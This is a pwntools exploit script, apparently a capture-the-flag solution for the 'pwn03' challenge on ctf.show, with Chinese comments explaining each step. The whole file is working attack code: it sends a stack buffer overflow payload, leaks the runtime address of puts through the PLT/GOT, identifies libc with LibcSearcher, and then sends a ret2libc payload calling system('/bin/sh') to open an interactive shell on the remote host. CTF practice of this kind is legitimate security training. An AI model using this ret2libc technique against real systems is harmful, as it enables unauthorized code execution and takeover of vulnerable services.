from pwn import *
from LibcSearcher import *

context(arch='i386', os='linux', log_level='debug')
# io = process('pwn03')
io = remote('pwn.challenge.ctf.show', 28067)
e = ELF('pwn03')
puts_plt = e.plt['puts']
log.success('puts_plt => %s' % hex(puts_plt))
puts_got = e.got['puts']
log.success('puts_got => %s' % hex(puts_got))
main_address = e.symbols['main']
log.success('main_address => %s' % hex(main_address))
# 先让栈溢出，再利用puts函数的plt表地址来泄露puts函数got表中的真实地址
payload = b'a'*0x9 + b'fuck' + p32(puts_plt) + p32(main_address) + p32(puts_got)
io.sendline(payload)
io.recvuntil('\n\n')
puts_address = u32(io.recv(4)) # 接收4个字节并解包
log.success('puts_address => %s' % hex(puts_address))
libc = LibcSearcher('puts', puts_address) # 获取libc版本,libc6-i386_2.27-3ubuntu1_amd64
libcbase = puts_address - libc.dump('puts')  # libc的基址=puts()函数地址-puts()函数偏移地址(0x67360)
log.success('libcbase_address => %s' % hex(libcbase))
system_address = libcbase + libc.dump('system') # system()函数的地址=libc的基址+system()函数偏移地址(0x03cd10)
log.success('system_address => %s' % hex(system_address))
bin_sh_address = libcbase + libc.dump('str_bin_sh') # '/bin/sh'的地址=libc的基址+'/bin/sh'偏移地址(0x17b8cf)
log.success('bin_sh_address => %s' % hex(bin_sh_address))
payload = b'a'*0x9 + b'fuck' + p32(system_address) + p32(0xdeadbeef) + p32(bin_sh_address)
io.sendline(payload)
io.interactive()